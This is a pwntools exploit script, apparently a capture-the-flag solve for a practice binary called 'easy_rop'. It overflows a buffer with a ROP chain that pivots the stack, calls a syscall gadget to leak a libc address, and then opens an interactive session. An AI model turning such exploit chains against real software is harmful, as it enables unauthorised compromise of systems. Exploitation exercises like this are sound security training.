#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
b*main
continue
"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.39.so")

exe = "./easy_rop"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

main = 0x0000000000401107
pivot = 0x404050
syscall = 0x0000000000401126
# 0x000000000040112e : pop rdi ; pop rbp ; ret
pop_rdi_rbp = 0x000000000040112e
# 0x00000000004010ed : pop rbp ; ret
# io.wait(2)
pop_rbp = 0x00000000004010ed
payload = b'a'*32 + p64(pivot) + p64(main) + p64(pivot) + p64(pop_rdi_rbp) + p64(1) + p64(pivot) + p64(syscall)
s(payload)
# io.wait(2)
s(b'a')
io.recv(0x68)
libc_leak = u64(io.recv(8)) 
info(f"libc leak: {hex(libc_leak)}")


io.interactive()

